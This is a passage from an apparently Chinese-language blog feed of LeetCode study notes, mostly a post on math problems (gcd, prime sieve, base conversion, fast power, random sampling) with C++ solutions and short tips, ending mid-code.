c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxCoins</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        nums.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">        nums.<span class="built_in">insert</span>(nums.<span class="built_in">begin</span>(), <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">3</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">2</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = i + <span class="number">1</span>; k &lt; j; ++k) &#123;</span><br><span class="line">                    <span class="type">int</span> sum = nums[i] * nums[k] * nums[j];</span><br><span class="line">                    sum += (dp[i][k] + dp[k][j]);</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i][j], sum);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题非常难想，要倒过来想成插入气球可以获得多少硬币，然后用二维数组dp[i][j]来表示i到j之间能获得多少硬币，i从后往前是因为i前面的计算依赖于当前的值。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 分治 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(七): 数学问题</title>
      <link href="/post/ebd95021.html"/>
      <url>/post/ebd95021.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、最大公约数和最小公倍数"><a href="#一、最大公约数和最小公倍数" class="headerlink" title="一、最大公约数和最小公倍数"></a>一、最大公约数和最小公倍数</h2><p>这个没什么好说的，辗转相除法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : <span class="built_in">gcd</span>(b, a % b); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lcm</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a * b / <span class="built_in">gcd</span>(a, b); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以通过扩展欧几里得算法(extended gcd)在求得a和b最大公因数的同时，也得到它们的系数x和y，从而使ax+by&#x3D;gcd(a, b)，也就是<strong>贝祖等式</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">xGCD</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x_inner, y_inner;</span><br><span class="line">    <span class="type">int</span> gcd = <span class="built_in">xGCD</span>(b, a % b, x_inner, y_inner);</span><br><span class="line">    x = y_inner, y = x_inner - (a / b) * y_inner;</span><br><span class="line">    <span class="keyword">return</span> gcd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、质数"><a href="#二、质数" class="headerlink" title="二、质数"></a>二、质数</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/count-primes">计数质数</a><br>给定整数n，返回 所有小于非负整数n的质数的数量。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPrimes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">prime</span><span class="params">(n, <span class="literal">true</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &gt; <span class="number">2</span>) ++count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">3</span>; i &lt; n; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prime[i]) ++count;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span> * i; j &lt; n; j += i) &#123;</span><br><span class="line">                prime[j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：埃拉托斯特尼筛法(Sieve of Eratosthenes，简称埃氏筛法)是非常常用的，判断一个整数是否是质数的方法。并且它可以在判断一个整数n时，同时判断所小于n的整数，因此非常适合这道题。其原理也十分易懂：从1到n遍历，假设当前遍历到m，则把所有小于n的、且是m的倍数的整数标为和数；遍历完成后，没有被标为和数的数字即为质数。</p></li></ul><h2 id="三、数字处理"><a href="#三、数字处理" class="headerlink" title="三、数字处理"></a>三、数字处理</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/base-7">七进制数</a><br>给定一个整数num，将其转化为7进制，并以字符串形式输出。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convertToBase7</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        <span class="type">bool</span> isNegative = num &lt; <span class="number">0</span>;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        num = isNegative ? -num : num;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(num % <span class="number">7</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            num /= <span class="number">7</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> isNegative ? <span class="string">&quot;-&quot;</span> + res : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单题，正常的模进制除进制。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/factorial-trailing-zeroes">阶乘后的零</a><br>给定一个非负整数，判断它的阶乘结果的结尾有几个0。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">trailingZeroes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            n /= <span class="number">5</span>;</span><br><span class="line">            count += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：就是算有多少个2*5，然而2的数量肯定远多于5，所以只需要算5的数量。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/add-strings">字符串相加</a><br>给定两个由数字组成的字符串，求它们相加的结果。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">addStrings</span><span class="params">(string num1, string num2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> minus = num<span class="number">1.l</span>ength() - num<span class="number">2.l</span>ength();</span><br><span class="line">        <span class="keyword">if</span> (minus &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; -minus; ++i)</span><br><span class="line">                num1 = <span class="string">&quot;0&quot;</span> + num1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; minus; ++i)</span><br><span class="line">                num2 = <span class="string">&quot;0&quot;</span> + num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> len = minus &lt; <span class="number">0</span> ? num<span class="number">2.l</span>ength() : num<span class="number">1.l</span>ength();</span><br><span class="line">        string res;</span><br><span class="line">        <span class="type">bool</span> c = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> temp1 = num1[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> temp2 = num2[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> add = temp1 + temp2 + c;</span><br><span class="line">            <span class="keyword">if</span> (add &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">                c = <span class="literal">true</span>;</span><br><span class="line">                res.<span class="built_in">push_back</span>(add - <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(add + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                c = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c) res.<span class="built_in">push_back</span>(c + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意进位。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/power-of-three">3的幂</a><br>判断一个数字是否是 3 的次方。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> mod = n % <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">if</span> (mod != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            n /= <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意有小于等于零的情况。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/powx-n">Pow[x, n]</a><br>计算x的n次方。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">double</span> res = <span class="number">1.0</span>, base = x;</span><br><span class="line">        <span class="type">bool</span> isNegative = (n &lt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (isNegative) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n == INT_MIN) &#123;</span><br><span class="line">                res *= x;</span><br><span class="line">                ++n;</span><br><span class="line">            &#125;</span><br><span class="line">            n = -n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span> == <span class="number">1</span>) res *= base;</span><br><span class="line">            base *= base;</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isNegative ? <span class="number">1</span> / res : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：是一个值得记住的快速幂算法，理解位运算的含义。</p></li></ul><h2 id="四、随机与取样"><a href="#四、随机与取样" class="headerlink" title="四、随机与取样"></a>四、随机与取样</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/shuffle-an-array">打乱数组</a><br>给定一个数组，要求实现两个指令函数。第一个函数“shuﬄe”可以随机打乱这个数组，第二个函数“reset”可以恢复原来的顺序。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; myNums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Solution</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        myNums = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">reset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> myNums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">shuffle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; randNums = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(myNums.<span class="built_in">begin</span>(), myNums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> size = randNums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 从后往前打乱</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(randNums[i], randNums[<span class="built_in">rand</span>() % (i + <span class="number">1</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 从前往后打乱</span></span><br><span class="line">        <span class="comment">// for (int i = 0; i &lt; n; ++i) &#123;</span></span><br><span class="line">        <span class="comment">// int pos = rand() % (n - i);</span></span><br><span class="line">        <span class="comment">// swap((randNums[i], randNums[i+pos]);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">return</span> randNums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：其实就是后面交换前面不重复的，前面交换后面不重复的。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/random-pick-with-weight">按权重随机选择</a><br>给定一个数组，数组每个位置的值表示该位置的权重，要求按照权重的概率去随机采样。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; myW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Solution</span>(vector&lt;<span class="type">int</span>&gt;&amp; w) &#123;</span><br><span class="line">        myW = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(w.<span class="built_in">begin</span>(), w.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; myW.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            myW[i] += myW[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pickIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> target = <span class="built_in">rand</span>() % myW.<span class="built_in">back</span>() + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = myW.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (myW[mid] &lt; target) low = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：利用前缀和来做，在[num[i-1]+1, num[i]]之中的随机数相当于采样的第i个值。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/linked-list-random-node">链表随机节点</a><br>给定一个单向链表，要求设计一个算法，可以随机取得其中的一个数字。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// struct ListNode &#123;</span></span><br><span class="line"><span class="comment">//     int val;</span></span><br><span class="line"><span class="comment">//     ListNode *next;</span></span><br><span class="line"><span class="comment">//     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment">//     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment">//     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    ListNode* myList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Solution</span>(ListNode* head) &#123;</span><br><span class="line">        myList = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getRandom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ListNode* node = myList;</span><br><span class="line">        <span class="type">int</span> res = node-&gt;val;</span><br><span class="line">        node = node-&gt;next;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">rand</span>() % i == <span class="number">0</span>) res = node-&gt;val;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用的核心思想是<strong>水库采样</strong>，在未遍历完链表前，我们无法知道链表的总长度。这里我们就可以使用水库采样：遍历一次链表，在遍历到第m个节点时，有1&#x2F;m的概率选择这个节点覆盖掉之前的节点选择。提供一个简单的，对于水库算法随机性的证明。对于长度为n的链表的第m个节点，最后被采样的充要条件是它被选择，且之后的节点都没有被选择。这种情况发生的概率为<strong>1&#x2F;m*m&#x2F;(m+1)*(m+1)&#x2F;(m+2)*…*(n-2)&#x2F;(n-1)*(n-1)&#x2F;n&#x3D;1&#x2F;n</strong>因此每个点都有均等的概率被选择。<br>另一种方法是用数组进行初始化，因为很简单就不展示了。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/excel-sheet-column-title">Excel 表列名称</a><br>给你一个整数 columnNumber ，返回它在 Excel 表中相对应的列名称。<br>例如：A -&gt; 1, B -&gt; 2, C -&gt; 3, Z -&gt; 26, AA -&gt; 27, AB -&gt; 28 </p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convertToTitle</span><span class="params">(<span class="type">int</span> columnNumber)</span> </span>&#123;</span><br><span class="line">        string res;</span><br><span class="line">        <span class="keyword">while</span> (columnNumber &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> temp = columnNumber % <span class="number">26</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="number">0</span>) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(<span class="string">&#x27;Z&#x27;</span>);</span><br><span class="line">                columnNumber = columnNumber / <span class="number">26</span> - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(temp + <span class="string">&#x27;A&#x27;</span> - <span class="number">1</span>);</span><br><span class="line">            columnNumber /= <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：Z相当于十进制中的10，所以处理的时候要注意单独处理。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/product-of-array-except-self">除自身以外数组的乘积</a><br>给你一个整数数组nums，返回数组answer，其中answer[i]等于nums中除nums[i]之外其余各元素的乘积。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">productExceptSelf</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(size, <span 